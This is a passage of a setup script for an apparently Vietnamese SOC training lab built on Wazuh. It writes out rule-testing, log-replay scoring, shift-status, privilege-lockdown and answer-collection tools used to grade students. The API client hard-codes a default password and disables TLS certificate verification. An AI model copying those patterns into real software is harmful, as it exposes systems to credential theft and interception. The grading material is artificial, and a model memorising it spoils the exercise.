        if backup_rules is not None:
            try:
                api.put_rule_file("local_rules.xml", backup_rules)
            except WazuhError:
                pass
        die("Wazuh khong tra loi buoc kiem tra cau hinh (may dang qua tai?): %s\n"
            "   -> Da khoi phuc luat truoc do. Doi 1-2 phut roi chay lai." % str(e)[:200])
    if not ok:
        print("   Cau hinh KHONG hop le: %s" % msg)
        if backup_rules is not None:
            api.put_rule_file("local_rules.xml", backup_rules)
            print("   -> Da KHOI PHUC luat truoc do. Manager khong bi khoi dong lai.")
        sys.exit(1)

    print("== 4) Khoi dong lai Wazuh manager (~1-2 phut)")
    if not api.restart():
        die("manager chua len lai sau 4 phut - chay lai lenh nay sau 1 phut.")

    if not dev:
        print("== 5) Chua co tap phat trien nao (yeu cau chua den) - luat DA nap, khong phat lai.")
        res = {}
    else:
        print("== 5) Phat lai tap phat trien: %s" % ", ".join(dev_sets))
        res = replay.run(replay.ApiEngine(api), dev, {f: r for f, r in ranges.items() if any(sc["family"] == f for sc in dev)})
        replay.print_dev(res)

    sha = hashlib.sha256(text.encode("utf-8")).hexdigest()[:12]
    summ = " ".join("%s:P%.2f/R%.2f" % (f, r["precision"], r["recall"]) for f, r in res.items())
    try:
        with open(os.path.join(home, ".kiem-thu.log"), "a") as f:
            f.write("%s sha=%s %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), sha, summ))
    except OSError:
        pass
    print("\nLuat dang nap tren Wazuh (sha %s) chinh la bai nop. Tap kiem tra AN khac tap nay." % sha)


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_system/usr/local/bin"
cat > "$LAB/defender/_system/usr/local/bin/thu-dong" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# thu-dong "<dong log>" [--location /var/log/auth.log]
# Chay MOT dong log qua Wazuh logtest voi bo luat DANG NAP. In: decoder, cac truong da tach,
# luat no (id, level, mo ta). Nhieu dong lien tiep trong cung phien: dung --stdin (moi dong 1 su kien).
# Ha tang DUNG CHUNG (Bai 16, 17, 18).
# ============================================================================
import argparse, json, os, sys

HERE = os.path.dirname(os.path.realpath(__file__))
for p in (HERE, "/usr/local/lib/soc-tools"):
    if os.path.isfile(os.path.join(p, "wzapi.py")):
        sys.path.insert(0, p)
        break
from wzapi import Wazuh, WazuhError


def show(out):
    dec = out.get("decoder") or {}
    print("  decoder : %s%s" % (dec.get("parent", "") + " > " if dec.get("parent") else "", dec.get("name", "(khong co)")))
    data = dict(out.get("data") or {})
    for k in ("srcip", "dstip", "srcuser", "dstuser", "srcport", "dstport", "url", "id", "status"):
        if k in out:
            data[k] = out[k]
    if data:
        print("  truong  : " + json.dumps(data, ensure_ascii=False))
    rule = out.get("rule") or {}
    if rule:
        mitre = ",".join((rule.get("mitre") or {}).get("id", []) or [])
        print("  luat    : id=%s level=%s %s%s" % (rule.get("id"), rule.get("level"), rule.get("description", ""),
                                             ("  [MITRE " + mitre + "]") if mitre else ""))
    else:
        print("  luat    : (khong luat nao no)")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("line", nargs="?", help="dong log (dat trong ngoac kep)")
    ap.add_argument("--stdin", action="store_true", help="doc nhieu dong tu stdin, cung 1 phien")
    ap.add_argument("--location", default="/var/log/auth.log")
    a = ap.parse_args()
    lines = [l.rstrip("\n") for l in sys.stdin if l.strip()] if a.stdin else ([a.line] if a.line else [])
    if not lines:
        ap.error("can 1 dong log hoac --stdin")
    api = Wazuh()
    token = None
    try:
        for i, ln in enumerate(lines, 1):
            token, out = api.logtest(ln, token, location=a.location)
            print("[%d] %s" % (i, ln[:110]))
            show(out)
    except WazuhError as e:
        print("LOI: %s" % e)
        sys.exit(1)
    finally:
        api.logtest_close(token)


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_system/usr/local/bin"
cat > "$LAB/defender/_system/usr/local/bin/trang-thai" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# trang-thai - Bai 18: tinh hinh ca truc (KHONG cho biet dung/sai).
import json, os, re, time, urllib.request
import xml.etree.ElementTree as ET

HOME = os.path.expanduser("~")
SIEM = os.environ.get("BAI18_SIEM", "http://172.20.0.20:8088")


def get(path):
    return json.loads(urllib.request.urlopen(SIEM + path, timeout=4).read())


mat_lien_lac = False
try:
    sh = get("/shift.json")
except Exception:  # noqa: BLE001
    sh = {}
    try:                                   # ca da chay ma siem khong tra loi (siem khoi dong lai?)
        sh = json.load(open(os.environ.get("BAI18_CACHE", "/var/tmp/bai18-shift.json")))
        mat_lien_lac = bool(sh.get("t0"))
    except (OSError, ValueError):
        sh = {}
try:
    if get("/canh-bao.json").get("loi") == "DIA_DAY":
        print("!! siem LOI: dia day -> Wazuh khong ghi duoc ticket moi. Bao giang vien / giai phong dia VM.")
except Exception:  # noqa: BLE001
    pass
if mat_lien_lac:
    print("!! Mat lien lac voi siem (co the dang khoi dong lai). Ca VAN tinh gio; ticket moi se hien khi siem len lai.")
if not sh.get("t0"):
    try:
        cb = get("/chuan-bi.json")
        print("Ca chua bat dau - siem dang chuan bi du lieu ca: xong %d/%d buoc (%s)."
              % (len(cb.get("xong", [])), cb.get("tong", 7), ", ".join(cb.get("xong", [])) or "-"))
    except Exception:  # noqa: BLE001
        print("Ca chua bat dau - siem dang khoi dong Wazuh (indexer/manager, thuong 5-10 phut).")
    print("Trong luc cho: doc ~/SOP-ca-truc.txt, ~/ban-giao-ca-truoc.txt, viet ~/ke-hoach.txt, khao-sat (TRUOC=).")
    print("Ca tu bat dau khi siem san sang; ban se thay thong bao o lenh ke tiep.")
    raise SystemExit(0)
now = time.time()
t0, end = sh["t0"], sh.get("end") or sh["t0"] + 5400
dur = (end - t0) / 60
print("Ca truc: phut %d / %d  (%s)" % ((min(now, end) - t0) // 60, dur,
                                       "DA HET CA - phieu da dong bang" if now >= end else "con %d phut" % ((end - now) // 60)))
tk = sorted((ts, inc) for inc, ts in (sh.get("tickets") or {}).items())
done = set()
try:
    for ln in open(os.path.join(HOME, "triage.txt"), encoding="utf-8", errors="replace"):
        m = re.match(r"^\s*INC-(\d+)\s*=\s*\S", ln)
        if m:
            done.add("INC-" + m.group(1))
except OSError:
    pass
print("Ticket da xuat hien: %d  | da co dong trong triage.txt: %d" % (len(tk), sum(1 for _, i in tk if i in done)))
miss = [i for _, i in tk if i not in done]
if miss:
    print("  chua co dong: " + ", ".join(miss))
for k in ("R-A", "R-B"):
    if k in (sh.get("released") or {}):
        dl = sh["released"][k] + 20 * 60 * float(sh.get("scale") or 1.0)
        tt = "het ca" if now >= end else ("QUA HAN" if now > dl else "con %d phut" % ((dl - now) // 60))
        print("Yeu cau %s: mo luc %s, han %s (%s)" % (k, time.strftime("%H:%M", time.localtime(sh["released"][k])),
              time.strftime("%H:%M", time.localtime(dl)), tt))
try:
    root = ET.fromstring("<r>" + open(os.path.join(HOME, "luat/local_rules.xml"), encoding="utf-8").read() + "</r>")
    ids = [(int(r.get("id")), int(r.get("level", "0"))) for r in root.iter("rule") if (r.get("id") or "").isdigit()]
    for name, lo, hi in (("R-A", 100330, 100339), ("R-B", 100340, 100349)):
        n = sum(1 for i, l in ids if lo <= i <= hi and l >= 10)
        print("File luat: %d luat canh bao dai %s (%d-%d)" % (n, name, lo, hi))
except (OSError, ET.ParseError, ValueError):
    print("File luat ~/luat/local_rules.xml: khong doc duoc (loi cu phap?)")
try:
    last = open(os.path.join(HOME, ".kiem-thu.log")).read().strip().splitlines()[-1]
    print("Lan nap gan nhat (kiem-thu-luat): " + last[:19])
except (OSError, IndexError):
    print("Chua nap luat lan nao (kiem-thu-luat).")
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_system/usr/local/lib/soc-tools"
cat > "$LAB/defender/_system/usr/local/lib/soc-tools/replay.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# replay.py - phat lai bo kich ban log (JSONL) qua Wazuh logtest, dem TP/FP/FN theo ho luat.
# Ha tang DUNG CHUNG (Bai 16, 17, 18). Xem README.md cung thu muc.
#
# Dinh dang moi dong JSONL:
#   {"id": "l1-m-03", "family": "l1", "label": "mal"|"benign", "variant": "...",
#    "window_s": 600, "lines": ["<dong syslog 1>", "<dong syslog 2>", ...]}
#
# Quy uoc dem (theo KICH BAN, khong theo dong log):
#   - Moi kich ban = 1 phien logtest rieng (token rieng) -> luat tan suat co trang thai trong phien.
#   - Kich ban DUONG TINH neu co >= 1 dong sinh canh bao level >= MIN_LEVEL
#     voi rule.id nam trong dai ID cua ho do.
#   - mal & duong tinh = TP ; mal & am tinh = FN ; benign & duong tinh = FP.
#   - Luat im lang hoan toan: precision = 0 (quy uoc), recall = 0.
#
# Dung:
#   replay.py --set dev.jsonl --ranges l1=100270-100279,l2=100280-100289 [--mode dev|grade|json]
# ============================================================================
import argparse, json, sys

MIN_LEVEL = 10


def load_set(path):
    out = []
    with open(path, encoding="utf-8") as f:
        for ln in f:
            ln = ln.strip()
            if ln:
                out.append(json.loads(ln))
    return out


def parse_ranges(s):
    rng = {}
    for part in (s or "").split(","):
        part = part.strip()
        if not part:
            continue
        fam, span = part.split("=")
        lo, hi = span.split("-")
        rng[fam.strip()] = (int(lo), int(hi))
    return rng


def scenario_hits(engine, sc, lo, hi, min_level=MIN_LEVEL):
    """engine(event, token) -> (token, output). Tra ve danh sach (rule_id, level) da no trong dai."""
    hits = []
    token = None
    try:
        for line in sc["lines"]:
            token, out = engine(line, token)
            rule = (out or {}).get("rule") or {}
            try:
                rid = int(rule.get("id", -1))
                lvl = int(rule.get("level", 0))
            except (TypeError, ValueError):
                continue
            if lo <= rid <= hi and lvl >= min_level:
                hits.append((rid, lvl))
    finally:
        if hasattr(engine, "close"):
            engine.close(token)
    return hits


def run(engine, scenarios, ranges):
    res = {}
    for fam, (lo, hi) in ranges.items():
        r = {"tp": 0, "fp": 0, "fn": 0, "tn": 0, "fp_ids": [], "fn_ids": [], "n_mal": 0, "n_benign": 0}
        for sc in scenarios:
            if sc.get("family") != fam:
                continue
            pos = bool(scenario_hits(engine, sc, lo, hi))
            mal = sc.get("label") == "mal"
            if mal:
                r["n_mal"] += 1
                if pos:
                    r["tp"] += 1
                else:
                    r["fn"] += 1
                    r["fn_ids"].append(sc["id"])
            else:
                r["n_benign"] += 1
                if pos:
                    r["fp"] += 1
                    r["fp_ids"].append(sc["id"])
                else:
                    r["tn"] += 1
        r["precision"] = (r["tp"] / (r["tp"] + r["fp"])) if (r["tp"] + r["fp"]) else 0.0
        r["recall"] = (r["tp"] / r["n_mal"]) if r["n_mal"] else 0.0
        res[fam] = r
    return res


class ApiEngine:
    """Bo phat lai that: goi Wazuh API /logtest."""

    def __init__(self, api):
        self.api = api

    def __call__(self, event, token):
        return self.api.logtest(event, token)

    def close(self, token):
        self.api.logtest_close(token)


def print_dev(res):
    print("%-5s %4s %4s %4s  %-9s %-6s" % ("HO", "TP", "FP", "FN", "PRECISION", "RECALL"))
    for fam, r in res.items():
        print("%-5s %4d %4d %4d  %-9.2f %-6.2f" % (fam, r["tp"], r["fp"], r["fn"], r["precision"], r["recall"]))
    for fam, r in res.items():
        if r["fp_ids"]:
            print("  [%s] kich ban BAO GIA (FP): %s" % (fam, ", ".join(r["fp_ids"])))
        if r["fn_ids"]:
            print("  [%s] kich ban BO SOT (FN): %s" % (fam, ", ".join(r["fn_ids"])))


def main():
    ap = argparse.ArgumentParser(description="Phat lai kich ban log qua Wazuh logtest")
    ap.add_argument("--set", required=True, help="file JSONL kich ban")
    ap.add_argument("--ranges", required=True, help="ho=tu-den,... vd l1=100270-100279")
    ap.add_argument("--mode", default="dev", choices=["dev", "grade", "json"])
    a = ap.parse_args()

    sys.path.insert(0, __import__("os").path.dirname(__import__("os").path.abspath(__file__)))
    from wzapi import Wazuh
    res = run(ApiEngine(Wazuh()), load_set(a.set), parse_ranges(a.ranges))
    if a.mode == "dev":
        print_dev(res)
    elif a.mode == "json":
        print(json.dumps(res))
    else:
        for fam, r in res.items():
            print("%s_TP=%d %s_FP=%d %s_FN=%d" % (fam.upper(), r["tp"], fam.upper(), r["fp"], fam.upper(), r["fn"]))


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_system/usr/local/lib/soc-tools"
cat > "$LAB/defender/_system/usr/local/lib/soc-tools/wzapi.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# wzapi.py - client toi gian cho Wazuh API (cong 55000). Chi dung thu vien chuan.
# Dung chung cho: kiem-thu-luat, thu-dong, replay.py (defender) va grade (siem).
#
# Cau hinh (bien moi truong, co mac dinh cho lab):
#   WZ_API_URL   (mac dinh https://172.20.0.20:55000)
#   WZ_API_USER  (mac dinh bai17-tool)
#   WZ_API_PASS  (mac dinh xem DEFAULT_PASS)
# ============================================================================
import base64, json, os, ssl, time, urllib.error, urllib.parse, urllib.request

DEFAULT_URL = "https://172.20.0.20:55000"
DEFAULT_USER = "soc-tool"
DEFAULT_PASS = "Soc.Tool.2026!"

_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE


class WazuhError(Exception):
    pass


class Wazuh:
    def __init__(self, url=None, user=None, password=None, timeout=30):
        self.url = (url or os.environ.get("WZ_API_URL") or DEFAULT_URL).rstrip("/")
        self.user = user or os.environ.get("WZ_API_USER") or DEFAULT_USER
        self.password = password or os.environ.get("WZ_API_PASS") or DEFAULT_PASS
        self.timeout = timeout
        self.token = None

    # ---------------- tang thap ----------------
    def _req(self, method, path, body=None, raw=None, ctype="application/json", auth=True, params=None, _try=0):
        url = self.url + path
        if params:
            url += "?" + urllib.parse.urlencode(params)
        data = None
        if raw is not None:
            data = raw if isinstance(raw, bytes) else raw.encode("utf-8")
        elif body is not None:
            data = json.dumps(body).encode("utf-8")
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("Content-Type", ctype)
        if auth:
            if not self.token:
                self.login()
            req.add_header("Authorization", "Bearer " + self.token)
        try:
            with urllib.request.urlopen(req, context=_CTX, timeout=self.timeout) as r:
                txt = r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            txt = e.read().decode("utf-8", "replace")
            if e.code == 401 and auth and self.token:
                # token het han -> dang nhap lai 1 lan
                self.token = None
                return self._req(method, path, body, raw, ctype, auth, params)
            if e.code == 500 and '"error": 3021' in txt and _try < 3:
                # 3021 = "Timeout executing API request": may ao qua tai, manager cham -> thu lai
                time.sleep(5 * (_try + 1))
                return self._req(method, path, body, raw, ctype, auth, params, _try + 1)
            raise WazuhError("HTTP %s %s %s: %s" % (e.code, method, path, txt[:400]))
        except Exception as e:
            raise WazuhError("%s %s: %s" % (method, path, e))
        try:
            return json.loads(txt) if txt else {}
        except ValueError:
            return {"raw": txt}

    def login(self):
        url = self.url + "/security/user/authenticate"
        req = urllib.request.Request(url, data=b"", method="POST")
        cred = base64.b64encode(("%s:%s" % (self.user, self.password)).encode()).decode()
        req.add_header("Authorization", "Basic " + cred)
        try:
            with urllib.request.urlopen(req, context=_CTX, timeout=self.timeout) as r:
                self.token = json.loads(r.read().decode())["data"]["token"]
        except urllib.error.HTTPError as e:
            raise WazuhError("Dang nhap API that bai (HTTP %s) - API chua san sang hoac sai tai khoan" % e.code)
        except Exception as e:
            raise WazuhError("Khong ket noi duoc Wazuh API %s: %s" % (self.url, e))
        return self.token

    # ---------------- ruleset ----------------
    def get_rule_file(self, name):
        r = self._req("GET", "/rules/files/" + name, params={"raw": "true"})
        return r.get("raw", "") if isinstance(r, dict) else r

    @staticmethod
    def _check_items(r, what):
        """API tra HTTP 200 ca khi KHONG ghi duoc file: loi nam trong data.failed_items."""
        d = (r or {}).get("data") or {}
        fails = d.get("failed_items") or []
        if fails or (d.get("total_affected_items") == 0 and "affected_items" in d):
            raise WazuhError("Wazuh KHONG ghi %s: %s" % (what, json.dumps(fails or r, ensure_ascii=False)[:500]))
        return r

    def put_rule_file(self, name, content):
        return self._check_items(self._req("PUT", "/rules/files/" + name, raw=content,
                                 ctype="application/octet-stream", params={"overwrite": "true"}), name)

    def put_list_file(self, name, content):
        return self._check_items(self._req("PUT", "/lists/files/" + name, raw=content,
                                 ctype="application/octet-stream", params={"overwrite": "true"}), name)

    # ---------------- manager ----------------
    def validate(self):
        """Tra ve (ok, thong_bao)."""
        r = self._req("GET", "/manager/configuration/validation")
        items = (r.get("data") or {}).get("affected_items") or []
        for it in items:
            if it.get("status") != "OK":
                return False, json.dumps(it.get("details", it), ensure_ascii=False)[:800]
        fails = (r.get("data") or {}).get("failed_items") or []
        if fails:
            return False, json.dumps(fails, ensure_ascii=False)[:800]
        return True, "OK"

    def restart(self, wait=240):
        """PUT /manager/restart chi XEP LICH restart (bat dong bo): vai giay dau /manager/status van
        bao tien trinh CU 'running' -> neu tra ve luc do, phat lai se chay tren bo luat CU.
        Phai thay manager XUONG (API mat ket noi / analysisd khong running) roi moi cho no LEN lai."""
        self._req("PUT", "/manager/restart")
        t0 = time.time()
        seen_down = False
        while time.time() - t0 < wait:
            time.sleep(3)
            try:
                self.token = None
                st = self._req("GET", "/manager/status")
                items = (st.get("data") or {}).get("affected_items") or [{}]
                up = items[0].get("wazuh-analysisd") == "running"
            except WazuhError:
                up = False
            if not up:
                seen_down = True
            elif seen_down or time.time() - t0 > 60:
                # da thay xuong roi len (hoac qua 60s ma khong bat duoc luc xuong) -> cho analysisd nap xong
                time.sleep(10)
                return True
        return False

    # ---------------- logtest ----------------
    def logtest(self, event, token=None, location="/var/log/auth.log", log_format="syslog"):
        body = {"event": event, "log_format": log_format, "location": location}
        if token:
            body["token"] = token
        r = self._req("PUT", "/logtest", body=body)
        d = r.get("data") or {}
        return d.get("token"), d.get("output") or {}

    def logtest_close(self, token):
        if not token:
            return
        try:
            self._req("DELETE", "/logtest/sessions/" + token)
        except WazuhError:
            pass
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_system/usr/local/sbin"
cat > "$LAB/defender/_system/usr/local/sbin/bai18-khoa-quyen" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/bin/bash
# bai18-khoa-quyen (root, systemd) - D4: SV KHONG co root tren defender.
# Anh nen labtainer.firefox3 cho user ubuntu vao nhom sudo, ma /etc/sudoers co '%sudo ALL=(ALL) NOPASSWD:ALL'.
# Labtainers CAN sudo luc khoi dong (parameterize.sh: chown, ParameterParser, fixlocal, hookBash...)
# -> chi khoa SAU KHI parameterize xong: no tao /var/labtainer/did_param o buoc cuoi.
# Sau khi khoa, ubuntu chi con /etc/sudoers.d/soc-tools (kiem-thu-luat, goi-y, bai18-thu-thap).
# Hook bash cua Labtainers (bash-pre-capinout.sh) chi DOC chu 'sudo' trong lenh, khong goi sudo -> khong anh huong.
LOG=/var/lib/soc-shift/khoa-quyen.log
mkdir -p /var/lib/soc-shift && chmod 700 /var/lib/soc-shift
for i in $(seq 1 360); do                       # toi da 30 phut
  [ -d /var/labtainer/did_param ] && break
  sleep 5
done
if [ ! -d /var/labtainer/did_param ]; then
  echo "$(date '+%F %T') CHUA thay /var/labtainer/did_param sau 30 phut - KHONG khoa" >> $LOG
  exit 1
fi
sleep 5                                          # parameterize con vai lenh sau mkdir did_param
for g in sudo wheel admin; do
  getent group $g >/dev/null && gpasswd -d ubuntu $g >/dev/null 2>&1
done
# Terminal mo TRUOC khi khoa van giu nhom 'sudo' trong tien trinh (sudo xet nhom cua tien trinh goi)
# -> them quy tac TU CHOI theo TEN user. sudoers: quy tac khop CUOI CUNG thang, file .d doc sau /etc/sudoers
# va theo thu tu ten -> 'zz-' dung cuoi; dong cong cu dat SAU '!ALL' nen van duoc phep.
TOOLS="/usr/local/sbin/bai18-thu-thap"
printf 'ubuntu ALL=(ALL) !ALL\nubuntu ALL=(root) NOPASSWD: %s\n' "$TOOLS" > /etc/sudoers.d/zz-bai18-khoa.tmp
chmod 440 /etc/sudoers.d/zz-bai18-khoa.tmp
if visudo -cf /etc/sudoers.d/zz-bai18-khoa.tmp >/dev/null; then
  mv /etc/sudoers.d/zz-bai18-khoa.tmp /etc/sudoers.d/zz-bai18-khoa
else
  rm -f /etc/sudoers.d/zz-bai18-khoa.tmp
  echo "$(date '+%F %T') LOI cu phap sudoers - chi go nhom" >> $LOG
fi
if sudo -u ubuntu sudo -n true 2>/dev/null; then
  echo "$(date '+%F %T') LOI: ubuntu VAN sudo duoc toan quyen" >> $LOG
  exit 1
fi
echo "$(date '+%F %T') da khoa quyen: $(id ubuntu)" >> $LOG
touch /var/lib/soc-shift/khoa-quyen.done
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_system/usr/local/sbin"
cat > "$LAB/defender/_system/usr/local/sbin/bai18-thu-thap" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# bai18-thu-thap (root; prestop goi 'sudo -n'). In cau tra loi cua SV theo THU TU PHAT (k = 1..n),
# CUNG thu tu ma siem in dap an (GT_*_k) -> goals.config so tung cap (matchany + result._gt_*).
# Phieu: doc ban DONG BANG neu da het ca (SHIFT_FROZEN), neu chua thi ban dang sua (SHIFT_RUNNING).
# KHONG in dap an (defender khong co dap an).
# ============================================================================
import json, os, pwd, re, urllib.request, zlib

HOME = os.environ.get("BAI18_HOME") or pwd.getpwnam("ubuntu").pw_dir
VAR = os.environ.get("BAI18_VAR", "/var/lib/soc-shift")
FROZEN = os.path.join(VAR, "frozen")
RE_INC = re.compile(r"^\s*INC-(\d+)\s*=\s*([0-9])\s*,\s*([0-9])\s*,\s*(?:[A-Za-z-]*?)(\d+)")
RE_KV = re.compile(r"^\s*([A-Z0-9_]+)\s*=\s*([^#\n]*)")


def read(rel):
    for base in ((FROZEN, HOME) if os.path.isdir(FROZEN) else (HOME,)):
        p = os.path.join(base, rel)
        if os.path.isfile(p):
            return open(p, encoding="utf-8", errors="replace").read()
    return ""


def kv(text):
    out = {}
    for ln in text.splitlines():
        m = RE_KV.match(ln)
        if m:
            out[m.group(1)] = m.group(2).strip()
    return out


# Moi truong so ma goals.config doc PHAI luon co mat: Labtainers bao loi grader neu result thieu.
# Bo trong -> NA (khong bao gio trung dap an; siem giua ca dung 999999).
NA = 999998
NSLOT = 13


def canon(vals):
    """GIONG grade18.canon tren siem: tap so -> 1 + moi so dem 0 thanh 5 chu so (0 neu rong)."""
    v = sorted({int(x) for x in vals})
    return int("1" + "".join("%05d" % x for x in v)) if v else 0


def crc(text):
    return zlib.crc32((text or "").strip().lower().encode())


def nums(s):
    return ",".join(sorted(set(re.findall(r"\d+", s or "")), key=int))


def main():
    print("SHIFT_FROZEN" if os.path.isdir(FROZEN) else "SHIFT_RUNNING")
    try:
        sh = json.loads(urllib.request.urlopen(os.environ.get("BAI18_SIEM", "http://172.20.0.20:8088") + "/shift.json", timeout=4).read())
    except Exception:  # noqa: BLE001
        sh = {}
    print("T0_DEF=%s" % sh.get("t0"))
    # cau tra loi: dong CUOI cung cho moi INC (ghi de)
    ans = {}
    for ln in read("triage.txt").splitlines():
        m = RE_INC.match(ln)
        if m:
            ans[m.group(1)] = (m.group(2), m.group(3), m.group(4))
    first = {}
    try:
        for ln in open(os.path.join(VAR, "log")):
            p = ln.split()
            if len(p) >= 3 and p[1] == "FIRST":
                first.setdefault(p[2][4:], int(p[0]))
    except OSError:
        pass
    scale = float(sh.get("scale") or 1.0)
    tickets = sorted(((ts, inc) for inc, ts in (sh.get("tickets") or {}).items()), key=lambda x: (x[0], x[1]))
    for k, (ts, inc) in enumerate(tickets, 1):
        n = inc[4:]
        a = ans.get(n)
        line = "INC_%d=%s" % (k, n)
        a = a or (NA, NA, NA)            # chua co dong -> gia tri giu cho (Labtainers loi neu result thieu)
        line += " ANS_V_%d=%s ANS_P_%d=%s ANS_E_%d=%s" % (k, a[0], k, a[1], k, a[2])
        if n in first:
            # MTTA (giay) do TREN defender: lan dau ghi dong - luc ticket phat (shift.json); SOP: P1 <= 10'
            lat = first[n] - ts
            line += " FIRST_%d=%d LAT_%d=%d LATOK_%d=%d" % (k, first[n], k, lat, k, 1 if lat <= 600 * scale else 0)
        print(line)
    for k in range(len(tickets) + 1, NSLOT + 1):          # slot chua phat (giua ca) - giu cho
        print("INC_%d=%d ANS_V_%d=%d ANS_P_%d=%d ANS_E_%d=%d" % (k, NA, k, NA, k, NA, k, NA))
    print("ANS_N=%d" % len(tickets))
    print("SCALE=%s" % scale)
    sc = kv(read("su-co.txt"))
    print("ANS_SC_TICKETS=%s" % nums(sc.get("SC1")))
    print("ANS_SC_TK_C=%d" % canon(re.findall(r"\d+", sc.get("SC1") or "")))
    print("ANS_SC_HOST=%s" % (sc.get("SC1_HOST") or "").strip().lower())
    print("ANS_SC_HOST_C=%d" % crc(sc.get("SC1_HOST")))
    print("ANS_SC_GIAI_DOAN=%s" % (re.findall(r"\d+", sc.get("SC1_GIAI_DOAN", "")) or [NA])[0])
    lt = kv(read("leo-thang/SC1.txt"))
    for k in ("TICKET", "HOST", "ASSET_LEVEL", "STAGE", "MITRE", "IOC_C2", "LIEN_QUAN", "DE_XUAT"):
        v = lt.get(k, "")
        if k in ("ASSET_LEVEL", "STAGE", "IOC_C2", "LIEN_QUAN", "TICKET"):
            v = (re.findall(r"\d+", v) or [NA])[0]
        elif k == "MITRE":                       # T1505.003 -> 1505 (chi ky thuat cha)
            v = ",".join(sorted(set(re.findall(r"(\d+)(?:\.\d+)?", v)), key=int))
        elif k == "DE_XUAT":
            v = nums(v)
        else:
            v = v.lower()
        print("LT_%s=%s" % (k, v))
        if k == "HOST":
            print("LT_HOST_C=%d" % crc(v))
        elif k in ("MITRE", "DE_XUAT"):
            print("LT_%s_C=%d" % (k, canon(v.split(",") if v else [])))
    edits = {}
    try:
        for ln in open(os.path.join(VAR, "log")):
            p = ln.split()
            if len(p) >= 3 and p[1] == "EDIT":
                edits.setdefault(p[2], []).append(int(p[0]))
    except OSError:
        pass
    for f, ts in sorted(edits.items()):
        print("EDITS_%s=%d FIRST_EDIT_%s=%d" % (re.sub(r"\W", "_", f), len(ts), re.sub(r"\W", "_", f), min(ts)))
    # ban giao viet SAU ca -> doc ban dang co trong HOME (khong dong bang)
    p = os.path.join(HOME, "ban-giao.txt")
    bg = kv(open(p, encoding="utf-8", errors="replace").read()) if os.path.isfile(p) else {}
    filled = sum(1 for v in bg.values() if v)
    print("BAN_GIAO_FILLED=%d" % filled)
    for k in ("SU_CO_DANG_MO", "SC_CHINH", "LUAT_DA_THAY_DOI", "TICKET_CHUA_XU_LY"):
        print("BG_%s=%s" % (k, bg.get(k, "")[:80]))
    ks = kv(open(os.path.join(HOME, "khao-sat.txt")).read()) if os.path.isfile(os.path.join(HOME, "khao-sat.txt")) else {}
    print("KS_TRUOC=%s KS_SAU=%s" % (ks.get("TRUOC", ""), ks.get("SAU", "")))
    for name, p in (("KIEM_THU_RUNS", ".kiem-thu.log"), ("GOI_Y_USES", ".goi-y.log")):
        try:
            print("%s=%d" % (name, sum(1 for _ in open(os.path.join(HOME, p)))))
        except OSError:
            print("%s=0" % name)


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_system/usr/local/sbin"
cat > "$LAB/defender/_system/usr/local/sbin/bai18-watcher" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# bai18-watcher (root, systemd bai18-watcher.service) - defender Bai 18.
#  - doc http://172.20.0.20:8088/shift.json moi 5 s (shiftd tren siem; KHONG co dap an)
#  - yeu cau R-A / R-B xuat hien -> chep vao ~/yeu-cau/<R>/ + nhac tren terminal
#  - truoc T0: nhac 'siem dang chuan bi'; nhac gio 60/80/90 phut (theo do dai ca that) (~/.ca-truc-nhac)
#  - T0 doi (reset-ca tren siem, chi phat trien): cat phieu cu vao ~/.ca-cu/, tra ban goc, bo dong bang
#  - ghi LAN DAU moi dong INC-xxx= trong ~/triage.txt va moi lan sua su-co / leo-thang
#    -> /var/lib/soc-shift/log (root 600; SV khong sua duoc) - dung tinh MTTA
#  - het ca -> chup triage.txt, su-co.txt, leo-thang/ vao /var/lib/soc-shift/frozen/ (root, 444)
# ============================================================================
import hashlib, json, os, pwd, re, shutil, time, urllib.request

SIEM = os.environ.get("BAI18_SIEM", "http://172.20.0.20:8088")    # bien moi truong: chi de thu nghiem
H = pwd.getpwnam(os.environ.get("BAI18_USER", "ubuntu"))
HOME = os.environ.get("BAI18_HOME", H.pw_dir)
VAR = os.environ.get("BAI18_VAR", "/var/lib/soc-shift")
LOG = os.path.join(VAR, "log")
FROZEN = os.path.join(VAR, "frozen")
NHAC = os.path.join(HOME, ".ca-truc-nhac")
CACHE = os.environ.get("BAI18_CACHE", "/var/tmp/bai18-shift.json")
RE_INC = re.compile(r"^\s*INC-(\d+)\s*=\s*(\S.*?)\s*(#.*)?$")
GOC = os.path.join(VAR, "goc")             # ban goc file phieu (chup truoc T0) - chi dung khi reset-ca (phat trien)
PHIEU = ("triage.txt", "su-co.txt", "leo-thang", "luat")


def msg(k, sh):
    """Nhac gio theo DO DAI CA THAT (che do nhanh: ca ngan hon 90')."""
    dur = max(1, ((sh.get("end") or 0) - (sh.get("t0") or 0)) / 60.0) if sh.get("end") else 90.0
    if k == "NHAC_60":
        return "Da %d phut. Con %d phut - kiem tra hang doi va ghi chu leo thang." % (round(dur * 60 / 90), round(dur * 30 / 90))
    if k == "NHAC_80":
